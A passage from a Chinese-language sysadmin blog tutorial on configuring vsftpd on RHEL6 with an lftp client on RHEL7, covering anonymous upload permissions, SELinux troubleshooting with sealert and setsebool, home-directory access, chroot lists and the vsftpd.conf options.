class="line">/usr/share/doc/vsftpd-2.2.2</span><br><span class="line">/usr/share/doc/vsftpd-2.2.2/AUDIT</span><br><span class="line">/usr/share/doc/vsftpd-2.2.2/BENCHMARKS</span><br><span class="line">/usr/share/doc/vsftpd-2.2.2/BUGS</span><br><span class="line">/usr/share/doc/vsftpd-2.2.2/COPYING</span><br><span class="line">/usr/share/doc/vsftpd-2.2.2/Changelog</span><br><span class="line">/usr/share/doc/vsftpd-2.2.2/EXAMPLE</span><br><span class="line">/usr/share/doc/vsftpd-2.2.2/EXAMPLE/INTERNET_SITE</span><br><span class="line">/usr/share/doc/vsftpd-2.2.2/EXAMPLE/INTERNET_SITE/README</span><br><span class="line">/usr/share/doc/vsftpd-2.2.2/EXAMPLE/INTERNET_SITE/README.configuration</span><br><span class="line">/usr/share/doc/vsftpd-2.2.2/EXAMPLE/INTERNET_SITE/vsftpd.conf</span><br><span class="line">/usr/share/doc/vsftpd-2.2.2/EXAMPLE/INTERNET_SITE/vsftpd.xinetd</span><br><span class="line">/usr/share/doc/vsftpd-2.2.2/EXAMPLE/INTERNET_SITE_NOINETD</span><br><span class="line">/usr/share/doc/vsftpd-2.2.2/EXAMPLE/INTERNET_SITE_NOINETD/README</span><br><span class="line">/usr/share/doc/vsftpd-2.2.2/EXAMPLE/INTERNET_SITE_NOINETD/README.configuration</span><br><span class="line">/usr/share/doc/vsftpd-2.2.2/EXAMPLE/INTERNET_SITE_NOINETD/vsftpd.conf</span><br><span class="line">/usr/share/doc/vsftpd-2.2.2/EXAMPLE/PER_IP_CONFIG</span><br><span class="line">/usr/share/doc/vsftpd-2.2.2/EXAMPLE/PER_IP_CONFIG/README</span><br><span class="line">/usr/share/doc/vsftpd-2.2.2/EXAMPLE/PER_IP_CONFIG/README.configuration</span><br><span class="line">/usr/share/doc/vsftpd-2.2.2/EXAMPLE/PER_IP_CONFIG/hosts.allow</span><br><span class="line">/usr/share/doc/vsftpd-2.2.2/EXAMPLE/README</span><br><span class="line">/usr/share/doc/vsftpd-2.2.2/EXAMPLE/VIRTUAL_HOSTS</span><br><span class="line">/usr/share/doc/vsftpd-2.2.2/EXAMPLE/VIRTUAL_HOSTS/README</span><br><span class="line">/usr/share/doc/vsftpd-2.2.2/EXAMPLE/VIRTUAL_USERS</span><br><span class="line">/usr/share/doc/vsftpd-2.2.2/EXAMPLE/VIRTUAL_USERS/README</span><br><span class="line">/usr/share/doc/vsftpd-2.2.2/EXAMPLE/VIRTUAL_USERS/README.configuration</span><br><span class="line">/usr/share/doc/vsftpd-2.2.2/EXAMPLE/VIRTUAL_USERS/logins.txt</span><br><span class="line">/usr/share/doc/vsftpd-2.2.2/EXAMPLE/VIRTUAL_USERS/vsftpd.conf</span><br><span class="line">/usr/share/doc/vsftpd-2.2.2/EXAMPLE/VIRTUAL_USERS/vsftpd.pam</span><br><span class="line">/usr/share/doc/vsftpd-2.2.2/EXAMPLE/VIRTUAL_USERS_2</span><br><span class="line">/usr/share/doc/vsftpd-2.2.2/EXAMPLE/VIRTUAL_USERS_2/README</span><br><span class="line">/usr/share/doc/vsftpd-2.2.2/FAQ</span><br><span class="line">/usr/share/doc/vsftpd-2.2.2/INSTALL</span><br><span class="line">/usr/share/doc/vsftpd-2.2.2/LICENSE</span><br><span class="line">/usr/share/doc/vsftpd-2.2.2/README</span><br><span class="line">/usr/share/doc/vsftpd-2.2.2/README.security</span><br><span class="line">/usr/share/doc/vsftpd-2.2.2/REWARD</span><br><span class="line">/usr/share/doc/vsftpd-2.2.2/SECURITY</span><br><span class="line">/usr/share/doc/vsftpd-2.2.2/SECURITY/DESIGN</span><br><span class="line">/usr/share/doc/vsftpd-2.2.2/SECURITY/IMPLEMENTATION</span><br><span class="line">/usr/share/doc/vsftpd-2.2.2/SECURITY/OVERVIEW</span><br><span class="line">/usr/share/doc/vsftpd-2.2.2/SECURITY/TRUST</span><br><span class="line">/usr/share/doc/vsftpd-2.2.2/SIZE</span><br><span class="line">/usr/share/doc/vsftpd-2.2.2/SPEED</span><br><span class="line">/usr/share/doc/vsftpd-2.2.2/TODO</span><br><span class="line">/usr/share/doc/vsftpd-2.2.2/TUNING</span><br><span class="line">/usr/share/doc/vsftpd-2.2.2/vsftpd.xinetd</span><br><span class="line">/usr/share/man/man5/vsftpd.conf.5.gz</span><br><span class="line">/usr/share/man/man8/vsftpd.8.gz</span><br><span class="line">/var/ftp</span><br><span class="line">/var/ftp/pub</span><br><span class="line"></span><br><span class="line">[root@rhel6 ~]# service vsftpd start</span><br><span class="line">Starting vsftpd for vsftpd:                                [  OK  ]</span><br><span class="line">[root@rhel6 ~]# netstat -luntp|grep vsftpd</span><br><span class="line">tcp        0      0 0.0.0.0:21                  0.0.0.0:*                   LISTEN      2940/vsftpd</span><br></pre></td></tr></table></figure>

<p><strong>客户端 rhel7</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel7 ~]# yum install -y lftp</span><br><span class="line">Loaded plugins: langpacks, product-id, subscription-manager</span><br><span class="line">This system is not registered to Red Hat Subscription Management. You can use subscription-manager to register.</span><br><span class="line">server                                                                | 4.1 kB  00:00:00     </span><br><span class="line">(1/2): server/group_gz                                                | 134 kB  00:00:00     </span><br><span class="line">(2/2): server/primary_db                                              | 3.4 MB  00:00:00     </span><br><span class="line">Resolving Dependencies</span><br><span class="line"><span class="meta">--&gt;</span><span class="bash"> Running transaction check</span></span><br><span class="line"><span class="meta">---&gt;</span><span class="bash"> Package lftp.x86_64 0:4.4.8-3.el7 will be installed</span></span><br><span class="line"><span class="meta">--&gt;</span><span class="bash"> Finished Dependency Resolution</span></span><br><span class="line"></span><br><span class="line">Dependencies Resolved</span><br><span class="line"></span><br><span class="line">=============================================================================================</span><br><span class="line"> Package           Arch                Version                     Repository           Size</span><br><span class="line">=============================================================================================</span><br><span class="line">Installing:</span><br><span class="line"> lftp              x86_64              4.4.8-3.el7                 server              749 k</span><br><span class="line"></span><br><span class="line">Transaction Summary</span><br><span class="line">=============================================================================================</span><br><span class="line">Install  1 Package</span><br><span class="line"></span><br><span class="line">Total download size: 749 k</span><br><span class="line">Installed size: 2.4 M</span><br><span class="line">Downloading packages:</span><br><span class="line">lftp-4.4.8-3.el7.x86_64.rpm                                           | 749 kB  00:00:00     </span><br><span class="line">Running transaction check</span><br><span class="line">Running transaction test</span><br><span class="line">Transaction test succeeded</span><br><span class="line">Running transaction</span><br><span class="line">  Installing : lftp-4.4.8-3.el7.x86_64                                                   1/1</span><br><span class="line">server/productid                                                      | 1.6 kB  00:00:00     </span><br><span class="line">  Verifying  : lftp-4.4.8-3.el7.x86_64                                                   1/1</span><br><span class="line"></span><br><span class="line">Installed:</span><br><span class="line">  lftp.x86_64 0:4.4.8-3.el7                                                                  </span><br><span class="line"></span><br><span class="line">Complete!</span><br><span class="line">[root@rhel7 ~]# systemctl stop firewalld</span><br><span class="line">[root@rhel7 ~]# getenforce</span><br><span class="line">Enforcing</span><br><span class="line"></span><br><span class="line">[root@rhel7 ~]# rpm -ql lftp</span><br><span class="line">/etc/lftp.conf</span><br><span class="line">/usr/bin/lftp</span><br><span class="line">/usr/bin/lftpget</span><br><span class="line">/usr/lib64/lftp</span><br><span class="line">/usr/lib64/lftp/4.4.8</span><br><span class="line">/usr/lib64/lftp/4.4.8/cmd-mirror.so</span><br><span class="line">/usr/lib64/lftp/4.4.8/cmd-sleep.so</span><br><span class="line">/usr/lib64/lftp/4.4.8/cmd-torrent.so</span><br><span class="line">/usr/lib64/lftp/4.4.8/liblftp-network.so</span><br><span class="line">/usr/lib64/lftp/4.4.8/liblftp-pty.so</span><br><span class="line">/usr/lib64/lftp/4.4.8/proto-file.so</span><br><span class="line">/usr/lib64/lftp/4.4.8/proto-fish.so</span><br><span class="line">/usr/lib64/lftp/4.4.8/proto-ftp.so</span><br><span class="line">/usr/lib64/lftp/4.4.8/proto-http.so</span><br><span class="line">/usr/lib64/lftp/4.4.8/proto-sftp.so</span><br><span class="line">/usr/lib64/liblftp-jobs.so.0</span><br><span class="line">/usr/lib64/liblftp-jobs.so.0.0.0</span><br><span class="line">/usr/lib64/liblftp-tasks.so.0</span><br><span class="line">/usr/lib64/liblftp-tasks.so.0.0.0</span><br><span class="line">/usr/share/doc/lftp-4.4.8</span><br><span class="line">/usr/share/doc/lftp-4.4.8/BUGS</span><br><span class="line">/usr/share/doc/lftp-4.4.8/COPYING</span><br><span class="line">/usr/share/doc/lftp-4.4.8/ChangeLog</span><br><span class="line">/usr/share/doc/lftp-4.4.8/FAQ</span><br><span class="line">/usr/share/doc/lftp-4.4.8/FEATURES</span><br><span class="line">/usr/share/doc/lftp-4.4.8/NEWS</span><br><span class="line">/usr/share/doc/lftp-4.4.8/README</span><br><span class="line">/usr/share/doc/lftp-4.4.8/README.debug-levels</span><br><span class="line">/usr/share/doc/lftp-4.4.8/README.dnssec</span><br><span class="line">/usr/share/doc/lftp-4.4.8/README.modules</span><br><span class="line">/usr/share/doc/lftp-4.4.8/THANKS</span><br><span class="line">/usr/share/doc/lftp-4.4.8/TODO</span><br><span class="line">/usr/share/locale/cs/LC_MESSAGES/lftp.mo</span><br><span class="line">/usr/share/locale/de/LC_MESSAGES/lftp.mo</span><br><span class="line">/usr/share/locale/es/LC_MESSAGES/lftp.mo</span><br><span class="line">/usr/share/locale/fr/LC_MESSAGES/lftp.mo</span><br><span class="line">/usr/share/locale/it/LC_MESSAGES/lftp.mo</span><br><span class="line">/usr/share/locale/ja/LC_MESSAGES/lftp.mo</span><br><span class="line">/usr/share/locale/ko/LC_MESSAGES/lftp.mo</span><br><span class="line">/usr/share/locale/pl/LC_MESSAGES/lftp.mo</span><br><span class="line">/usr/share/locale/pt_BR/LC_MESSAGES/lftp.mo</span><br><span class="line">/usr/share/locale/ru/LC_MESSAGES/lftp.mo</span><br><span class="line">/usr/share/locale/zh_CN/LC_MESSAGES/lftp.mo</span><br><span class="line">/usr/share/locale/zh_HK/LC_MESSAGES/lftp.mo</span><br><span class="line">/usr/share/locale/zh_TW/LC_MESSAGES/lftp.mo</span><br><span class="line">/usr/share/man/man1/lftp.1.gz</span><br><span class="line">/usr/share/man/man1/lftpget.1.gz</span><br><span class="line">/usr/share/man/man5/lftp.conf.5.gz</span><br></pre></td></tr></table></figure>

<blockquote>
<p>1.从客户端以匿名用户来访问ftp服务</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel7 ~]# lftp 172.25.0.11</span><br><span class="line">lftp 172.25.0.11:~&gt; cd pub</span><br><span class="line">cd ok, cwd=/pub</span><br><span class="line">lftp 172.25.0.11:/pub&gt; ls</span><br><span class="line">lftp 172.25.0.11:/pub&gt; put rhel7</span><br><span class="line">put: Access failed: 550 Permission denied. (rhel7)</span><br></pre></td></tr></table></figure>

<p><strong>当前的情况</strong></p>
<p>匿名用户能够访问/var/ftp/pub，能够查看文件内容，能够下载；不能上传文件,不能删除文件。</p>
<p><strong>问题的解决</strong></p>
<p>报错550，没有权限上传文件</p>
<p>我们要分析权限有哪些？</p>
<ol>
<li>vsftpd的配置文件</li>
<li>UGO、特殊、隐藏、ACL、</li>
<li>SELINUX</li>
</ol>
<p><strong>1.修改主配置文件</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim /etc/vsftpd/vsftpd.conf</span><br><span class="line">anon_upload_enable=YES</span><br></pre></td></tr></table></figure>

<p><strong>2./var/ftp/pub 目录o-rwx</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel6 pub]# ll -d /var/ftp/pub</span><br><span class="line">drwxr-xrwx. 2 root root 4096 Aug  3 10:35 /var/ftp/pub</span><br></pre></td></tr></table></figure>

<p><strong>3.测试</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">lftp 172.25.0.11:/pub&gt; put rhel7</span><br><span class="line">put: Access failed: 553 Could not create file. (rhel7)</span><br></pre></td></tr></table></figure>

<p>目前修改了配置文件和ugo权限还是报错553，不能create file</p>
<p>我们分析一下，只有selinux的权限问题了</p>
<p><strong>4.SELINUX</strong></p>
<p>如何确定是否是selinux的原因，可以通过以下步骤：</p>
<ul>
<li>1)先关闭selinux，测试ok的</li>
<li>2)开启selinux，测试no的</li>
</ul>
<p>我们需要去分析selinux的记录，分析工具是<code>sealert</code>,由<code>setroubleshoot</code>软件安装。</p>
<ol>
<li>查看当前系统中是否有sealert工具    <code>which sealert</code></li>
<li>安装setroubleshoot        <code>yum install -y setroubleshoot</code></li>
<li>分析selinux记录        <code>sealert -a /var/log/audit/audit.log</code></li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">*****  Plugin allow_anon_write (53.1 confidence) suggests  *******************</span><br><span class="line"></span><br><span class="line">If you want to allow /usr/sbin/vsftpd to be able to write to shared public content</span><br><span class="line">Then you need to change the label on pub to public_content_rw_t, and potentially turn on the</span><br><span class="line">allow_httpd_sys_script_anon_write boolean.</span><br><span class="line">Do</span><br><span class="line"><span class="meta">#</span><span class="bash"> semanage fcontext -a -t public_content_rw_t pub</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> restorecon -R -v pub</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> setsebool -P allow_ftpd_anon_write 1</span></span><br><span class="line"></span><br><span class="line">[root@rhel6 pub]# semanage fcontext -a -t public_content_rw_t /var/ftp/pub</span><br><span class="line">[root@rhel6 pub]# restorecon -R -v /var/ftp/pub</span><br><span class="line">[root@rhel6 pub]# ll -Zd /var/ftp/pub</span><br><span class="line">drwxr-xrwx. root root system_u:object_r:public_content_rw_t:s0 /var/ftp/pub</span><br></pre></td></tr></table></figure>

<p><strong>5.再测试</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">lftp 172.25.0.11:/pub&gt; put rhel7</span><br><span class="line">lftp 172.25.0.11:/pub&gt; ls</span><br><span class="line">-rw-------    1 14       50              0 Aug 03 05:53 rhel7</span><br><span class="line">lftp 172.25.0.11:/pub&gt; exit</span><br></pre></td></tr></table></figure>

<p>此时，我们发现匿名用户已经可以成功地对/var/ftp/pub目录进行上传下载了！</p>
<hr>
<h4 id="项目实践2-真实用户（系统用户）能够访问家目录，上传下载删除"><a href="#项目实践2-真实用户（系统用户）能够访问家目录，上传下载删除" class="headerlink" title="项目实践2: 真实用户（系统用户）能够访问家目录，上传下载删除"></a>项目实践2: 真实用户（系统用户）能够访问家目录，上传下载删除</h4><p>在项目实践1的基础上完成。</p>
<p><strong>服务端 rhel6</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel6 ftp]# id student</span><br><span class="line">uid=500(student) gid=500(student) groups=500(student)</span><br><span class="line">[root@rhel6 ftp]# passwd student</span><br><span class="line">Changing password for user student.</span><br><span class="line">New password:</span><br><span class="line">BAD PASSWORD: it is based on a dictionary word</span><br><span class="line">Retype new password:</span><br><span class="line">passwd: all authentication tokens updated successfully.</span><br><span class="line"></span><br><span class="line">[root@rhel6 ftp]# su - student</span><br><span class="line">[student@rhel6 ~]$ pwd</span><br><span class="line">/home/student</span><br><span class="line">[student@rhel6 ~]$ touch file1</span><br><span class="line">[student@rhel6 ~]$ echo aaa &gt; file1</span><br></pre></td></tr></table></figure>

<p><strong>客户端 rhel7</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel7 ~]# lftp student@172.25.0.11</span><br><span class="line">Password:</span><br><span class="line">lftp student@172.25.0.11:~&gt; ls      </span><br><span class="line">ls: Login failed: 500 OOPS: cannot change directory:/home/student</span><br></pre></td></tr></table></figure>

<p><strong>当前的情况</strong> 系统用户student不能访问家目录。</p>
<p><strong>问题的解决</strong></p>
<p>报错500，没有权限进入用户家目录</p>
<p>配置文件没有问题，ugo权限没有问题，只剩下selinux，需要分析</p>
<p><strong>1.分析selinux</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 服务器端</span></span><br><span class="line">[root@rhel6 ftp]# sealert -a /var/log/audit/audit.log</span><br><span class="line"></span><br><span class="line">*****  Plugin catchall_boolean (47.5 confidence) suggests  *******************</span><br><span class="line"></span><br><span class="line">If you want to allow ftp to read and write files in the user home directories</span><br><span class="line">Then you must tell SELinux about this by enabling the 'ftp_home_dir'boolean.</span><br><span class="line">Do</span><br><span class="line">setsebool -P ftp_home_dir 1</span><br></pre></td></tr></table></figure>

<p><strong>2.修改布尔值</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel6 ftp]# setsebool -P ftp_home_dir 1</span><br></pre></td></tr></table></figure>

<p><strong>3.测试</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 客户端</span></span><br><span class="line">lftp student@172.25.0.11:~&gt; ls</span><br><span class="line">lftp student@172.25.0.11:~&gt; pwd  </span><br><span class="line">ftp://student@172.25.0.11/%2Fhome/student</span><br><span class="line">lftp student@172.25.0.11:~&gt; ls</span><br><span class="line">-rw-rw-r--    1 500      500             4 Aug 03 07:13 file1</span><br><span class="line">lftp student@172.25.0.11:~&gt; cat file1</span><br><span class="line">aaa</span><br><span class="line">4 bytes transferred</span><br><span class="line">lftp student@172.25.0.11:~&gt; get file1</span><br><span class="line">4 bytes transferred</span><br><span class="line">lftp student@172.25.0.11:~&gt; put</span><br><span class="line">.ICEauthority  .bashrc	 .dbus/     .tcshrc	Music/	    Videos/		  rhel7</span><br><span class="line">.bash_history  .cache/	 .esd_auth  Desktop/	Pictures/   anaconda-ks.cfg	  test1</span><br><span class="line">.bash_logout   .config/  .local/    Documents/	Public/     file1</span><br><span class="line">.bash_profile  .cshrc	 .ssh/	    Downloads/	Templates/  initial-setup-ks.cfg</span><br><span class="line">lftp student@172.25.0.11:~&gt; put rhel7</span><br><span class="line">lftp student@172.25.0.11:~&gt; ls</span><br><span class="line">-rw-rw-r--    1 500      500             4 Aug 03 07:13 file1</span><br><span class="line">-rw-r--r--    1 500      500             0 Aug 03 07:13 rhel7</span><br><span class="line">lftp student@172.25.0.11:~&gt; rm file1</span><br><span class="line">rm ok, \`file1\' removed</span><br><span class="line">lftp student@172.25.0.11:~&gt; ls</span><br><span class="line">-rw-r--r--    1 500      500             0 Aug 03 07:13 rhel7</span><br></pre></td></tr></table></figure>

<p>系统用户已经可以实现能够访问家目录，并且能够下载、上传、删除了！</p>
<hr>
<h4 id="项目实践3-除了系统用户student有chroot的权限，其他系统用户没有chroot的权限"><a href="#项目实践3-除了系统用户student有chroot的权限，其他系统用户没有chroot的权限" class="headerlink" title="项目实践3: 除了系统用户student有chroot的权限，其他系统用户没有chroot的权限"></a>项目实践3: 除了系统用户student有chroot的权限，其他系统用户没有chroot的权限</h4><ul>
<li>匿名用户的根目录    /var/ftp/</li>
<li>系统用户的根目录    /home/student/</li>
</ul>
<table>
<thead>
<tr>
<th align="left"></th>
<th align="left">chroot_local_user=YES</th>
<th align="left">chroot_local_user=NO</th>
</tr>
</thead>
<tbody><tr>
<td align="left">chroot_list_enable=YES</td>
<td align="left">不能换根，有例外</td>
<td align="left">都能换根，有例外</td>
</tr>
<tr>
<td align="left">chroot_list_enable=NO</td>
<td align="left">不能换根，没例外</td>
<td align="left">都能换根，没例外</td>
</tr>
</tbody></table>
<p>如果指定 <code>chroot_list_enable=YES</code> 则需要指定文件位置 <code>chroot_list_file=/etc/vsftpd/chroot_list</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel7 ~]# lftp batman@172.25.0.11</span><br><span class="line">Password:</span><br><span class="line">lftp batman@172.25.0.11:~&gt; ls       </span><br><span class="line">lftp batman@172.25.0.11:~&gt; cd /tmp</span><br><span class="line">cd ok, cwd=/tmp</span><br><span class="line">lftp batman@172.25.0.11:/tmp&gt; pwd</span><br><span class="line">ftp://batman@172.25.0.11/%2Ftmp</span><br><span class="line">lftp batman@172.25.0.11:/tmp&gt; exit</span><br></pre></td></tr></table></figure>

<p><strong>当前的情况</strong> 所有的系统用户都能够chroot，而要求除了student用户之外的所有系统用户都不能chroot。</p>
<p><strong>解决方法</strong></p>
<p>可以选择<code>不能换根，有例外</code></p>
<p><strong>1.修改配置文件</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 服务器端</span></span><br><span class="line">[root@rhel6 ~]# vim /etc/vsftpd/vsftpd.conf</span><br><span class="line">chroot_local_user=YES</span><br><span class="line">chroot_list_enable=YES</span><br><span class="line">chroot_list_file=/etc/vsftpd/chroot_list</span><br></pre></td></tr></table></figure>

<p><strong>2.创建chroot_list</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel6 ~]# vim /etc/vsftpd/chroot_list</span><br><span class="line">[root@rhel6 ~]# cat /etc/vsftpd/chroot_list</span><br><span class="line">student</span><br></pre></td></tr></table></figure>

<p><strong>3.重启服务</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel6 ~]# service vsftpd restart</span><br><span class="line">Shutting down vsftpd:                                      [  OK  ]</span><br><span class="line">Starting vsftpd for vsftpd:                                [  OK  ]</span><br></pre></td></tr></table></figure>

<p><strong>2.测试</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 客户端    </span></span><br><span class="line">[root@rhel7 ~]# lftp batman@172.25.0.11</span><br><span class="line">Password:</span><br><span class="line">lftp batman@172.25.0.11:~&gt; cd /etc/</span><br><span class="line">cd: Access failed: 550 Failed to change directory. (/etc)</span><br><span class="line">lftp batman@172.25.0.11:/&gt; exit</span><br><span class="line">[root@rhel7 ~]# lftp student@172.25.0.11</span><br><span class="line">Password:</span><br><span class="line">lftp student@172.25.0.11:~&gt; cd /etc</span><br><span class="line">cd ok, cwd=/etc                  </span><br><span class="line">lftp student@172.25.0.11:/etc&gt; exit</span><br></pre></td></tr></table></figure>

<p><strong>当前的情况</strong></p>
<p>系统用户student可以切换根目录，而batman不在chroot_list文件中所以不能切换根目录。</p>
<h5 id="拓展内容"><a href="#拓展内容" class="headerlink" title="拓展内容"></a>拓展内容</h5><p><strong>为什么root用户不能通过ftp协议访问服务器？</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel7 ~]# lftp root@172.25.0.11</span><br><span class="line">Password:</span><br><span class="line">lftp root@172.25.0.11:~&gt; ls         </span><br><span class="line">ls: Login failed: 530 Permission denied.</span><br></pre></td></tr></table></figure>

<p>因为有用户访问控制列表<code>/etc/vsftpd/user_list</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel6 ~]# grep userlist_enable /etc/vsftpd/vsftpd.conf</span><br><span class="line">userlist_enable=YES</span><br><span class="line"></span><br><span class="line">[root@rhel6 ftp]# cat /etc/vsftpd/user_list</span><br><span class="line"><span class="meta">#</span><span class="bash"> vsftpd userlist</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> If userlist_deny=NO, only allow users <span class="keyword">in</span> this file</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> If userlist_deny=YES (default), never allow users <span class="keyword">in</span> this file, and</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="keyword">do</span> not even prompt <span class="keyword">for</span> a password.</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Note that the default vsftpd pam config also checks /etc/vsftpd/ftpusers</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="keyword">for</span> users that are denied.</span></span><br><span class="line">root</span><br><span class="line">bin</span><br><span class="line">daemon</span><br><span class="line">adm</span><br><span class="line">lp</span><br><span class="line">sync</span><br><span class="line">shutdown</span><br><span class="line">halt</span><br><span class="line">mail</span><br><span class="line">news</span><br><span class="line">uucp</span><br><span class="line">operator</span><br><span class="line">games</span><br><span class="line">nobody</span><br></pre></td></tr></table></figure>


<hr>
<h4 id="了解vsftpd的配置文件"><a href="#了解vsftpd的配置文件" class="headerlink" title="了解vsftpd的配置文件"></a>了解vsftpd的配置文件</h4><table>
<thead>
<tr>
<th align="left">配置文件</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">/etc/vsftpd/vsftpd.conf</td>
<td align="left">主配置文件</td>
</tr>
<tr>
<td align="left">/usr/sbin/vsftpd</td>
<td align="left">Vsftpd的主程序</td>
</tr>
<tr>
<td align="left">/etc/rc.d/init.d/vsftpd</td>
<td align="left">启动脚本</td>
</tr>
<tr>
<td align="left">/etc/pam.d/vsftpd</td>
<td align="left">PAM认证文件（此文件中file=/etc/vsftpd/ftpusers字段，指明阻止访问的用户来自/etc/vsftpd/ftpusers文件中的用户）</td>
</tr>
<tr>
<td align="left">/etc/vsftpd/ftpusers</td>
<td align="left">禁止使用vsftpd的用户列表文件。记录不允许访问FTP服务器的用户名单，管理员可以把一些对系统安全有威胁的用户账号记录在此文件中，以免用户从FTP登录后获得大于上传下载操作的权利，而对系统造成损坏。</td>
</tr>
<tr>
<td align="left">/etc/vsftpd/user_list</td>
<td align="left">禁止或允许使用vsftpd的用户列表文件。这个文件中指定的用户缺省情况（即在/etc/vsftpd/vsftpd.conf中设置userlist_deny=YES）下也不能访问FTP服务器，在设置了userlist_deny=NO时,仅允许user_list中指定的用户访问FTP服务器。</td>
</tr>
<tr>
<td align="left">/var/ftp</td>
<td align="left">匿名用户主目录；本地用户主目录为：/home/用户主目录，即登录后进入自己家目录</td>
</tr>
<tr>
<td align="left">/var/ftp/pub</td>
<td align="left">匿名用户的下载目录，此目录需赋权根chmod 1777 pub（1为特殊权限，使上载后无法删除）</td>
</tr>
<tr>
<td align="left">/etc/logrotate.d/vsftpd.log</td>
<td align="left">Vsftpd的日志文件</td>
</tr>
</tbody></table>
<h5 id="vsftpd的主配置文件-etc-vsftpd-vsftpd-conf说明"><a href="#vsftpd的主配置文件-etc-vsftpd-vsftpd-conf说明" class="headerlink" title="vsftpd的主配置文件/etc/vsftpd/vsftpd.conf说明"></a>vsftpd的主配置文件/etc/vsftpd/vsftpd.conf说明</h5><p>和Linux系统中的大多数配置文件一样，vsftpd的配置文件中以#开始注释。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">是否允许匿名登录FTP服务器，默认设置为YES允许</span><br><span class="line"><span class="meta">#</span><span class="bash"> 用户可使用用户名ftp或anonymous进行ftp登录，口令为用户的E-mail地址。</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 如不允许匿名访问则设置为NO</span></span><br><span class="line">anonymous_enable=YES</span><br><span class="line"><span class="meta">#</span><span class="bash"> 是否允许本地用户(即linux系统中的用户帐号)登录FTP服务器，默认设置为YES允许</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 本地用户登录后会进入用户主目录，而匿名用户登录后进入匿名用户的下载目录/var/ftp/pub</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 若只允许匿名用户访问，前面加上<span class="comment">#注释掉即可阻止本地用户访问FTP服务器</span></span></span><br><span class="line">local_enable=YES</span><br><span class="line"><span class="meta">#</span><span class="bash"> 是否允许本地用户对FTP服务器文件具有写权限，默认设置为YES允许</span></span><br><span class="line">write_enable=YES</span><br><span class="line"><span class="meta">#</span><span class="bash"> 掩码，本地用户默认掩码为077</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 你可以设置本地用户的文件掩码为缺省022，也可根据个人喜好将其设置为其他值</span></span><br><span class="line"><span class="meta">#</span><span class="bash">local_umask=022</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 是否允许匿名用户上传文件，须将全局的write_enable=YES。默认为YES</span></span><br><span class="line"><span class="meta">#</span><span class="bash">anon_upload_enable=YES</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 是否允许匿名用户创建新文件夹</span></span><br><span class="line"><span class="meta">#</span><span class="bash">anon_mkdir_write_enable=YES</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 是否激活目录欢迎信息功能</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 当用户用CMD模式首次访问服务器上某个目录时，FTP服务器将显示欢迎信息</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 默认情况下，欢迎信息是通过该目录下的.message文件获得的</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 此文件保存自定义的欢迎信息，由用户自己建立</span></span><br><span class="line"><span class="meta">#</span><span class="bash">dirmessage_enable=YES</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 是否让系统自动维护上传和下载的日志文件</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 默认情况该日志文件为/var/<span class="built_in">log</span>/vsftpd.log,也可以通过下面的xferlog_file选项对其进行设定</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 默认值为NO</span></span><br><span class="line">xferlog_enable=YES</span><br><span class="line"><span class="meta">#</span><span class="bash"> Make sure PORT transfer connections originate from port 20 (ftp-data).</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 是否设定FTP服务器将启用FTP数据端口的连接请求</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> ftp-data数据传输，21为连接控制端口</span></span><br><span class="line">connect_from_port_20=YES</span><br><span class="line"><span class="meta">#</span><span class="bash"> 设定是否允许改变上传文件的属主，与下面一个设定项配合使用</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 注意，不推荐使用root用户上传文件</span></span><br><span class="line"><span class="meta">#</span><span class="bash">chown_uploads=YES</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 设置想要改变的上传文件的属主，如果需要，则输入一个系统用户名</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 可以把上传的文件都改成root属主。whoever：任何人</span></span><br><span class="line"><span class="meta">#</span><span 